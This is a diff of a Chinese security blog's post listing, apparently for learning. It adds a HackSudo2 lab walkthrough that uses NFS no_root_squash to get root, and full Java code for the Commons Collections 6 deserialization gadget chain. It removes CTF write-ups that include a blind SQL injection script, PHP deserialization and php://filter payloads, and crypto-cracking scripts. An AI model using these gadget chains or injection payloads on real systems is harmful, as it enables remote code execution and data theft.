@@ -172,6 +172,212 @@
         
 
 <div class="post">
+    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">HackSudo2靶机 通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>发现vmWare的kali扫不到virtualbox的靶机<br>网上找了挺久资料都没解决 索性全桥接上物理机了</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/c9ce06a03da44d0198f537a51030da47.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/1d7f63201a9f496e957ddf4cdf48493b.png" alt="在这里插入图片描述"><br>都看了一眼 没什么有用的<br>然后回到file.php</p>
+<p>感觉之前做过类似的靶场,猜测存在文件包含<br>随便传个file试试<br><img src="https://img-blog.csdnimg.cn/6267918e996f45168c304a3099093e9a.png" alt="在这里插入图片描述"></p>
+<p>确实有 考虑日志文件包含<br>之前看phpinfo的时候知道是apache<br>试了试没成功<br>且phpinfo中说了不允许远程包含<br><img src="https://img-blog.csdnimg.cn/52321fc0e68b484cb9608951817b5041.png" alt="在这里插入图片描述"><br>web上我暂时想不到什么突破口了<br>把读到的passwd放到user.txt中<br>看看能不能ssh爆破一下<br><img src="https://img-blog.csdnimg.cn/1851e615c40c48fe9b0314996536553b.png" alt="在这里插入图片描述"><br>这里试试登hacksudo<br>也没爆出来 回头看看还有那些服务<br>还有nfs<br>那应该突破口就是nfs了<br><img src="https://img-blog.csdnimg.cn/85683f9acd984f2e85ba547733782818.png" alt="在这里插入图片描述"></p>
+<p>然后去读nfs的配置信息<br><img src="https://img-blog.csdnimg.cn/aa02dec3f3d64eb7af74ac2f84874413.png" alt="在这里插入图片描述"><br>有写权限 且发现是<code>no_root_squash</code>的<br><code>no_root_squash</code>：允许客户端以root用户访问，root用户具有根目录的完全控制访问权限</p>
+<p>直接写shell<br><img src="https://img-blog.csdnimg.cn/dc89a617e5bf4a36818d360e06333fb0.png" alt="在这里插入图片描述"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化一下shell<br><code>/usr/bin/script -qc /bin/bash /dev/null</code><br><code>ctrl+z</code><br><code>stty raw -echo;fg</code></p>
+<p>然后在kali上复制个bash进&#x2F;mnt<br>由于no_root_squash 我们在挂载目录中是root权限<br><img src="https://img-blog.csdnimg.cn/8658bbfd5244458d8b92fe8fa8e6df3d.png" alt="在这里插入图片描述"><br><code>./bash -p</code><br><img src="https://img-blog.csdnimg.cn/bba45cd147f44a6fac696f5acc66f828.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7f15a9b926894f159c666d96c288eb46.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections6链分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>前面和CC1一样<br>优点是不限制jdk版本和cc的版本</p>
+<p>先开一个<code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/742f4fb0ceb143e9a7f2936f418ed278.png" alt="在这里插入图片描述"><br>然后创<code>LazyMap</code> 我们顺便执行一下避免上面写错<br><img src="https://img-blog.csdnimg.cn/3648efc3e819457db79e3214a15e9769.png" alt="在这里插入图片描述"><br>能弹计算器 没问题<br>后面就是CC6不同的地方了</p>
+<p>我们需要一个<code>TiedMapEntry</code><br>因为需要一个类调用了get方法<br>在<code>TiedMapEntry</code>的<code>getValue()</code>方法中调用了<code>get() </code>其中<code>map</code>和<code>key</code>都可控<br><img src="https://img-blog.csdnimg.cn/29ed92d267d343c5820511e1f1b17145.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/efa2a12eeaa247c989a419346e807c18.png" alt="在这里插入图片描述"><br>那么我们就需要一个类调用<code>getValue</code>方法 TiedMapEntry的hashCode方法就可以<br><img src="https://img-blog.csdnimg.cn/a95a621fed834b718b8e3733845b9cfc.png" alt="在这里插入图片描述"></p>
+<p>然后类似URLDNS的链子 我们可以知道这里可以用<code>HashMap</code>连上<br><code>HashMap</code>的<code>readObject</code>方法会调用<code>hashCode</code><br><img src="https://img-blog.csdnimg.cn/cdfc39954c9c40f3838874a228a3960f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cd6a4dd4898c4c2e95d355282d195346.png" alt="在这里插入图片描述"><br>至此链子结束 我们可以写出如下代码</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry,&quot;ccc&quot;);
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+
+
+    &#125;
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>尝试执行 发现确实能弹计算器<br>但是这里存在和URLDNS一样的问题 , 就是这个计算器弹的时机是在<code>map2.put</code>的时候<br>而不是我们期望的反序列化的时候</p>
+<p>原因是HashMap在put的时候已经给整条链走完了<br><img src="https://img-blog.csdnimg.cn/a45f2a63880c4fdd90294707baa6e941.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fcea8304eb2c4ecc86d53e572f68923b.png" alt="在这里插入图片描述"><br>因为这里的key !&#x3D; null 所以继续进了hashCode<br><img src="https://img-blog.csdnimg.cn/c2d83b6ada7d40d7add8bbbfb16257ac.png" alt="在这里插入图片描述"><br>LazyMap调用get<br><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"><br>然后没有<code>key</code> <code>put</code>进去了 在后面反序列化的时候就有<code>key</code>了<br>有<code>key</code>就直接<code>return map.get(key)</code>了</p>
+<p>为了避免这种情况 我们需要 让最开始传入的东西不能形成链子 就是说改LazyMap 改 TiedMapEntry 之类的的都行,只要不在反序列化前弹计算器就行<br>然后要记得给put进来的key remove掉<br>于是最终代码如下</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry, &quot;ccc&quot;);
+        lazyMap.remove(&quot;xxx&quot;);
+        Field field = LazyMap.class.getDeclaredField(&quot;factory&quot;);
+        field.setAccessible(true);
+        field.set(lazyMap, chainedTransformer);
+
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+
+
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
         <h2 class="post-title">DRIFTINGBLUES-1靶机通关详解</h2>
     </a>
@@ -215,12 +421,12 @@ chmod +x emergency
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
     </div>
@@ -405,17 +611,17 @@ public class App
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #00a596">java</a>
         </span>
         
     </div>
@@ -638,7 +844,7 @@ echo urlencode(serialize($pop));
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
@@ -864,7 +1070,7 @@ echo urlencode(serialize($p)).&quot;\n&quot;;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
@@ -874,12 +1080,12 @@ echo urlencode(serialize($p)).&quot;\n&quot;;
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #03a9f4">前端</a>
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00a596">前端</a>
         </span>
         
     </div>
@@ -1159,7 +1365,7 @@ print(long_to_bytes(m))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
         </span>
         
     </div>
@@ -1270,17 +1476,17 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
@@ -1331,7 +1537,7 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
     </div>
@@ -1629,288 +1835,6 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/python/" style="color: #ffa2c4">python</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/06/02/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(2)/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/">
-        <h2 class="post-title">2023天一永安杯rsa复盘</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/5/23
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h1><pre><code class="c">from Crypto.Util.number import *
-from math import gcd
-from secret import flag
-
-def gen_key(nbits, gamma):
-    g = getPrime(int(nbits * gamma)) 
-    alpha = 0.5 - gamma
-    while True:
-        a = getPrime(int(alpha * nbits))
-        p = 2 * g * a + 1 
-        if isPrime(p):
-            break
-    while True:
-        b = getRandomNBitInteger(int(alpha * nbits))
-        q = 2 * g * b + 1
-        h = 2 * g * a * b + a + b
-        if isPrime(q) and isPrime(h) and gcd(a, b) == 1:
-            return p*q,a,g
-        else:
-            continue
-        
-n,a,g = gen_key(1024, 0.05)
-e = 65537
-c = pow(bytes_to_long(flag),e,a*g)
-print(n,c,a)
-
-&#39;&#39;&#39;
-n=36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379
-c=532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
-a=2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
-&#39;&#39;&#39;
-</code></pre>
-<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>其实挺简单的,当初一看500分,觉得不是我能动的题,下来复盘了一下后悔没细看</p>
-<p>过程如下<br><code>p*q = 2g(a+b) + 4ab*g**2 +1 </code><br>而<code>a+b+2gab == h</code><br>化简得到<br><code>p*q-1 = 2gh</code></p>
-<p>本题的公钥是<code>(e,a*g)</code><br>我们可以考虑用<code>p*q-1 = 2gh</code><br>分解得到g<br><code>n = (n-1) // 2</code></p>
-<p>因为g是<code>51位</code>的<br>h是约为<code>972位</code>的<br>相差很大可以用yafu分解或者factordb查一下<br>得到</p>
-<pre><code class="c">g = 1346104232461691
-
-h = 13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679
-</code></pre>
-<p>于是脚本如下</p>
-<pre><code class="python">from Crypto.Util.number import *
-import gmpy2
-
-c = 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
-a = 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
-g = 1346104232461691
-e = 65537
-
-d = gmpy2.invert(e,(g-1)*(a-1))
-print(long_to_bytes(pow(c,d,a*g)))
-# b&#39;flag&#123;p01la4d_rHo_a1gOr1thM_r1gh4&#125;&#39;
-</code></pre>
-<p>后来做到了羊城杯2021的一道类似的rsa<br>才知道这是<code>Common Prime RSA</code><br>常见的攻击方法有<br>1.修改Pollard’s rho方法分解n<br>2.知道a,b<br>3.知道g<br>4.分解n-1</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>痛失线下赛,要哭哭惹</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
-        </span>
-        
-    </div>
-    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/">
-        <h2 class="post-title">2023天一永安杯部分wp</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/5/22
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>布尔盲注</p>
-<pre><code class="python">import requests
-import string
-
-dictionary = string.digits+string.ascii_letters+&quot;_-&#123;,&#125;&quot;
-url = &quot;http://cd5a2660b462c867.node.nsctf.cn/login.php&quot;
-xxx=&quot;&quot;
-for i in range(1,666):
-    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
-    for j in dictionary:
-        flag = True
-        
-        # payload = &quot;admin&#39;and substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1) = binary&#39;&#123;&#125;&#39; #&quot;.format(i,j)  
-        # payload = &quot;admin&#39;and substr((select group_concat(table_name) from information_schema.tables where table_schema = &#39;ctf&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
-        # payload = &quot;admin&#39;and substr((select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name = &#39;f111&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
-        payload = &quot;admin&#39;and substr((select group_concat(flagdata) from ctf.f111),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
-
-        data = &#123;&#39;password&#39;:&#39;admin&#39;,&#39;username&#39;:payload&#125;
-        res = requests.post(url=url,data=data)
-
-        if (&#39;admin&#39; in res.text):
-            xxx += j
-            print(xxx)
-            flag = False
-            break
-    if(flag):
-        print(xxx)
-        break
-</code></pre>
-<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>伪协议读源码</p>
-<p>route.php</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/d01ad9ca8d2e7da82cf71d2b907aa258.png" alt="image-20230520130408427"></p>
-<p>h1nt.php</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/f00204ef3a75d5f39fe8b86f06b56452.png" alt="image-20230520130421846"></p>
-<p>构造</p>
-<pre><code class="php">&lt;?php
-class test
-&#123;
-    public $position = &#39;f14g.php&#39;;
-    public function __clone()&#123;  
-        echo file_get_contents($this-&gt;position); 
-        return $this-&gt;position;
-    &#125;
-&#125;  
-$a = new test();
-echo urlencode(serialize($a));
-</code></pre>
-<p>然后在index.php包含h1nt.php</p>
-<pre><code>read=h1nt.php&amp;input=O%3A4%3A%22test%22%3A1%3A%7Bs%3A8%3A%22position%22%3Bs%3A8%3A%22f14g.php%22%3B%7D
-</code></pre>
-<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><p>这里利用data协议使得get_file_content返回的值为flag</p>
-<pre><code>?a=data://text/plain,flag&amp;b=data://text/plain,flag&amp;c=flag&amp;d=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php
-</code></pre>
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>e phi 不互素</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/15960561067d54be25329549f37a1ee4.png" alt="image-20230520133647746"></p>
-<h2 id="流哇流"><a href="#流哇流" class="headerlink" title="流哇流"></a>流哇流</h2><p>flag2</p>
-<pre><code class="python">from sympy import *
-from gmpy2 import *
-from functools import reduce
-from primefac import *
-def egcd(a, b):
-    if a == 0:
-        return (b, 0, 1)
-    else:
-        g, y, x = egcd(b % a, a)
-        return (g, x - (b // a) * y, y)
-def modinv(a, m):
-    g, x, y = egcd(a, m)
-    if g != 1:
-        raise Exception(&#39;modular inverse does not exist&#39;)
-    else:
-        return x % m
-def crack_unknown_increment(states, modulus, multiplier): 
-    increment = (states[1] - states[0]*multiplier) % modulus 
-    return modulus, multiplier, increment
-def crack_unknown_multiplier(states, modulus):    
-    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
-    return crack_unknown_increment(states, modulus, multiplier)
-
-def crack_unknown_modulus(states): 
-    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
-    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
-    modulus = abs(reduce(gcd, zeroes)) 
-    return crack_unknown_multiplier(states, modulus)
-
-states = [7762911616316678361, 8778349545254661087, 2182563361653435704, 1383751637647655272, 4512576578889812021, 4322633144718249958, 3959701111371594748, 7676663421477866678, 5009230933212388616, 3780469426700690705]
-seed = 6473702802409947663
-modulus, multiplier, increment =crack_unknown_modulus(states)
-print(modulus)   #9223372036854775783
-print(multiplier)   # 672257317069504228
-print(increment) #0
-</code></pre>
-<p>flag1找到类似的原题了,ciscn的</p>
-<p>直接改改数值套脚本</p>
-<pre><code class="python">key = &#39;11110010001101101001001110001001&#39;
-mask = &#39;10100100000010000000100010010100&#39;
- 
-R = &#39;&#39;
-tem = key
-for i in range(32):
-    output = &#39;?&#39; + key[:31]
-    ans = int(tem[-1-i]) ^ int(output[-3]) ^ int(output[-5]) ^ int(output[-8]) ^ int(output[-12]) ^ int(output[-20]) ^ int(output[-27]) ^ int(output[-30])
-    R += str(ans)
-    key = str(ans) + key[:31]
- 
-# R = format(int(R[::-1],2),&#39;z&#39;)
-R = str(hex(int(R[::-1],2))[2:])
-print(R)
-</code></pre>
-<pre><code class="python">flag2 = 9223372036854775783
-# flag1 = 0x81415720
-flag1 = 2168543008
-flag = &#39;81415720&#39;+str(flag2)
-print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
-</code></pre>
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>爆破密码01组成的9位</p>
-<p>然后解压得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/cd2b8c4828c69e7d98fd075cdc1a763d.png" alt="image-20230520133753893"></p>
-<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/54606980448d92c26f0fe643e9137b46.png" alt="image-20230520133905424"></p>
-<p>foremost 抽出pdf 全选复制得到flag</p>
-<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/4e23291ee711087bf6bc4315e8648cf2.png" alt="image-20230520133831529"></p>
-<p>zsteg 出base64 解码得flag</p>
-<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="peacock"><a href="#peacock" class="headerlink" title="peacock"></a>peacock</h2><p>dex2jar</p>
-<p>看了看jar包没什么东西,那么核心应该在so里</p>
-<p>ida看so文件</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7c97834bb931d58cb735a3b046941f0c.png" alt="image-20230520131457608"></p>
-<p>感觉最后那两个字符串像base64</p>
-<p>然后考虑base64换表,表就是下面那个,解得flag</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>妈的应该是阳了,头巨痛,还得好好学,输出太低了</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
             <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
@@ -1921,21 +1845,16 @@ print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
+            <a href="/tags/python/" style="color: #00a596">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #00bcd4">php</a>
-        </span>
-        
-        <span class="tag">
-            
